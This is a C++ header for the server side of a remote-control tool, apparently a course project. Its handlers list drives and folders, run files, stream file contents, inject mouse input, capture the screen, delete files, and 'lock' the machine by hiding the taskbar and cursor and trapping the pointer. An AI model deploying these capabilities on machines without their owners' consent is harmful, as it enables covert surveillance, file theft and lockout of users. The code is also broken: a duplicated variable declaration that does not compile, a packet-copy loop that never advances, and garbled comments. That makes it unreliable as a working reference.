#pragma once
#include "resource.h"
#include<map>
#include "Packet.h"
#include<atlimage.h>
#include<direct.h>
#include "EdoyunTool.h"
#include<io.h>
#include<stdio.h>
#include<list>
#include"LockInfoDialog.h"
#include<vector>
#pragma warning(disable:4996)   //fopen sprintf strstr strcpy
class CFunction {
public:
	static CFunction* getInstance() {
		if (m_instance == nullptr) {
			m_instance = new CFunction();
		}
		return m_instance;
	}
	void DealCommand(size_t nCmd, CPacket& inpack, std::vector<std::vector<char>>& lstPack) {
		std::list<CPacket>lstPack_tem;
		int ret = m_instance->ExcuteCommand(nCmd, lstPack_tem, inpack);
		if (ret < 0)TRACE("解析错误！！\r\n");
		for (int i = 0; i < lstPack_tem.size(); i++) {
			CPacket pack = lstPack_tem.front();
			std::vector<char>temData(pack.size(), 0);
			memcpy(temData.data(), pack.Data(), pack.size());
			lstPack.push_back(temData);
		}
	}
	int ExcuteCommand(int nCmd, std::list<CPacket>& listPacket, CPacket& inPacket);
	static void RunCommand(void* arg, int status, std::list<CPacket>& listPacket,
		CPacket& inPacket) {
		CFunction* thiz = (CFunction*)arg;
		if (status > 0) {
			int ret = thiz->ExcuteCommand(status, listPacket, inPacket);
			if (ret != 0) {
				TRACE("执行命令失败：%d ret=%d\r\n", status, ret);
			}
		}
		else {
			MessageBox(NULL, _T("无法正常接入用户,自动重试"),
				_T("接入用户失败"), MB_OK | MB_ICONERROR);
		}
	}
private:
	static CFunction* m_instance;
	static void releaseInstance() {
		if (m_instance != nullptr) {
			CFunction* tem = m_instance;
			m_instance = nullptr;
			delete tem;
		}
	}
	class Helper {
	public:
		Helper() {
			//getInstance();
		}
		~Helper() {
			releaseInstance();
		}
	};
	static Helper helper;
protected:
	CFunction();
	~CFunction() {}
	typedef int(CFunction::* CMDFUNC)(std::list<CPacket>& listPacket, CPacket& inPacket);
	std::map<int, CMDFUNC>m_mapFunction;
	CPacket m_pack;
	CLockInfoDialog dlg;
	unsigned threadid;
protected:
	static unsigned _stdcall threadLockDlg(void* arg) {
		CFunction* thiz = (CFunction*)arg;
		thiz->threadLockDlgMain();
		_endthreadex(0);
		return 0;
	}
	void threadLockDlgMain() {
		TRACE("%s(%d):%d\r\n", __FUNCTION__, __LINE__, GetCurrentThreadId());
		dlg.Create(IDD_DIALOG_INFO, NULL);
		dlg.ShowWindow(SW_SHOW);
		CRect rect;
		rect.left = 0;
		rect.top = 0;
		rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
		rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN);
		rect.bottom = LONG(rect.bottom * 1.10);

		CWnd* pText = dlg.GetDlgItem(IDC_STATIC);
		if (pText) {
			CRect rtText;
			pText->GetWindowRect(rtText);
			int nWidth = rtText.Width();
			int x = (rect.right - nWidth) / 2;
			int nHeight = rtText.Height();
			int y = (rect.bottom - nHeight) / 2;
			pText->MoveWindow(x, y, rtText.Width(), rtText.Height());
		}

		dlg.MoveWindow(rect);
		dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
		ShowCursor(false);
		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
		dlg.GetWindowRect(rect);
		ClipCursor(rect);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
			if (msg.message == WM_KEYDOWN) {
				TRACE("msg:%08X wparam:%08X lparam:%08X\r\n", msg.message, msg.wParam, msg.lParam);
				if (msg.wParam == 0x1B) {
					break;
				}
			}
		}
		ClipCursor(NULL);
		ShowCursor(true);
		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
		dlg.DestroyWindow();
	}
	int MakeDriverInfo(std::list<CPacket>& listPacket, CPacket& inPacket) {
		std::string result;
		for (int i = 1; i <= 26; i++) {
			if (_chdrive(i) == 0) {
				if (result.size() > 0)
					result += ',';
				result += 'A' + i - 1;
			}
		}
		CPacket pack(1, (BYTE*)result.c_str(), result.size());//����õģ�
		listPacket.push_back(pack);
		return 0;
	}
	int MakeDirectoryInfo(std::list<CPacket>& listPacket, CPacket& inPacket) {
		std::string strPath = inPacket.strData;
		//std::list<FILEINFO>listFileInfos;

		if (_chdir(strPath.c_str()) == -1) {
			FILEINFO finfo;
			finfo.HasNext = FALSE;
			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
			listPacket.push_back(pack);
			OutputDebugString(_T("û�з���Ȩ�ޣ���"));
			return -2;
		}
		_finddata_t fdata;
		int hfind = 0;
		if ((hfind = _findfirst("*", &fdata)) == -1) {
			OutputDebugString(_T("û���ҵ��κ��ļ�����"));
			FILEINFO finfo;
			finfo.HasNext = FALSE;
			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
			listPacket.push_back(pack);
			return -3;
		}
		int count = 0;
		do {
			FILEINFO finfo;
			finfo.IsDirectory = (fdata.attrib & _A_SUBDIR) != 0;
			memcpy(finfo.szFileName, fdata.name, strlen(fdata.name));
			TRACE(("finfo.szFileName:%s\r\n"), finfo.szFileName);
			CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
			listPacket.push_back(pack);
			count++;
			//listFileInfos.push_back(finfo);
		} while (!_findnext(hfind, &fdata));
		TRACE(_T("send count:%d\r\n"), count);
		FILEINFO finfo;
		finfo.HasNext = FALSE;
		CPacket pack(2, (BYTE*)&finfo, sizeof(finfo));
		listPacket.push_back(pack);

		return 0;
	}

	int Runfile(std::list<CPacket>& listPacket, CPacket& inPacket) {
		std::string strPath = inPacket.strData;
		ShellExecuteA(NULL, NULL, strPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
		CPacket pack(3, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}
	int DownloadFile(std::list<CPacket>& listPacket, CPacket& inPacket) {
		std::string strPath = inPacket.strData;
		FILE* file = NULL;
		errno_t err = fopen_s(&file, strPath.c_str(), "rb");
		long long data = 0;
		if (err != 0) {
			CPacket pack(4, (BYTE*)&data, 8);
			listPacket.push_back(pack);
			return -1;
		}
		if (file != NULL) {
			fseek(file, 0, SEEK_END);
			data = _ftelli64(file);
			CPacket head(4, (BYTE*)&data, 8);
			listPacket.push_back(head);
			fseek(file, 0, SEEK_SET);
			char buff[1024] = "";
			size_t rlen = 0;
			do {
				rlen = fread(buff, 1, 1024, file);
				CPacket pack(4, (BYTE*)buff, rlen);
				listPacket.push_back(pack);
			} while (rlen >= 1024);
			fclose(file);
		}
		//CPacket pack(4, NULL, 0);
		//listPacket.push_back(pack);
		return 0;
	}

	int MouseEvent(std::list<CPacket>& listPacket, CPacket& inPacket) {
		MOUSEEV mouse;
		memcpy(&mouse, inPacket.strData.c_str(), inPacket.strData.size());
		DWORD nFlags = 0;
		switch (mouse.nButton) {
		case 0://左键；
			nFlags = 1;
			break;
		case 1://右键
			nFlags = 2;
			break;
		case 2://中键；
			nFlags = 4;
			break;
		case 4://没有按键，鼠标移动
			nFlags = 8;
			break;
		}
		if (nFlags != 8) {
			SetCursorPos(mouse.ptXY.x, mouse.ptXY.y);
		}
		switch (mouse.nAction) {
		case 0://单击；1,2,4,8表示4个比特位；
			nFlags |= 0x10;
			break;
		case 1://双击；
			nFlags |= 0x20;
			break;
		case 2://按下；
			nFlags |= 0x40;
			break;
		case 3://放开；
			nFlags |= 0x80;
			break;
		default:
			break;
		}
		TRACE("mouse event : %08X x =%d, y =%d\r\n", nFlags, mouse.ptXY.x, mouse.ptXY.y);
		switch (nFlags) {
		case 0x21://左键双击
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
		case 0x11://左键单击
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x41://左键按下
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x81://左键放开
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, GetMessageExtraInfo());
			break;

		case 0x22:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
		case 0x12:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x42:
			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x82:
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, GetMessageExtraInfo());
			break;

		case 0x24:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
		case 0x14:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x44:
			mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x84:
			mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, GetMessageExtraInfo());
			break;
		case 0x08:  //移动鼠标；
			mouse_event(MOUSEEVENTF_MOVE, mouse.ptXY.x, mouse.ptXY.y, 0, GetMessageExtraInfo());
			break;
		}
		CPacket pack(5, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}

	int SendScreen(std::list<CPacket>& listPacket, CPacket& inPacket) {
		CImage screen;//GDI
		HDC hScreen = ::GetDC(NULL);
		int nBitPerPixel = GetDeviceCaps(hScreen, BITSPIXEL);
		int nWidth = GetDeviceCaps(hScreen, HORZRES);
		int nHeight = GetDeviceCaps(hScreen, VERTRES);
		screen.Create(nWidth, nHeight, nBitPerPixel);
		BitBlt(screen.GetDC(), 0, 0, nWidth, nHeight, hScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hScreen);
		HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 0);
		if (hMem == NULL)return -1;
		IStream* pStream = NULL;
		HRESULT ret = CreateStreamOnHGlobal(hMem, TRUE, &pStream);
		if (ret == S_OK) {
			//screen.Save(_T("test2024.jpg"), Gdiplus::ImageFormatJPEG);
			screen.Save(pStream, Gdiplus::ImageFormatJPEG);
			LARGE_INTEGER bg = { 0 };
			pStream->Seek(bg, STREAM_SEEK_SET, NULL);
			PBYTE pData = (PBYTE)GlobalLock(hMem);
			SIZE_T nSize = GlobalSize(hMem);
			CPacket pack(6, pData, nSize);
			listPacket.push_back(pack);
			GlobalUnlock(hMem);
		}
		//screen.Save(_T("test2020.webp"), Gdiplus::ImageFormatTIFF);
		pStream->Release();
		GlobalFree(hMem);
		screen.ReleaseDC();
		return 0;
	}
	int LockMachine(std::list<CPacket>& listPacket, CPacket& inPacket) {
		if ((dlg.m_hWnd == NULL) || (dlg.m_hWnd == INVALID_HANDLE_VALUE)) {
			// _beginthread(threadLockDlg, 0, NULL);
			_beginthreadex(NULL, 0, threadLockDlg, this, 0, &threadid);
			TRACE("threadid=%d\r\n", threadid);
		}
		CPacket pack(7, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}

	int UnloakMachine(std::list<CPacket>& listPacket, CPacket& inPacket) {
		PostThreadMessage(threadid, WM_KEYDOWN, 0x1b, 0x10001);//根据线程来的；
		CPacket pack(8, NULL, 0);
		CPacket pack(8, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}

	int TestConnect(std::list<CPacket>& listPacket, CPacket& inPacket) {
		CPacket pack(1981, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}

	int DeleteLocalFile(std::list<CPacket>& listPacket, CPacket& inPacket) {
		std::string strPath = inPacket.strData;
		TCHAR sPath[MAX_PATH] = _T("");
		//mbstowcs(sPath, strPath.c_str(), strPath.size());
		MultiByteToWideChar(
			CP_ACP, 0, strPath.c_str(), strPath.size(), sPath,
			sizeof(sPath) / sizeof(TCHAR));
		if (DeleteFileA(strPath.c_str()) == 0) {
			AfxMessageBox(_T("删除文件失败！！"));
		}
		CPacket pack(9, NULL, 0);
		listPacket.push_back(pack);
		return 0;
	}
};


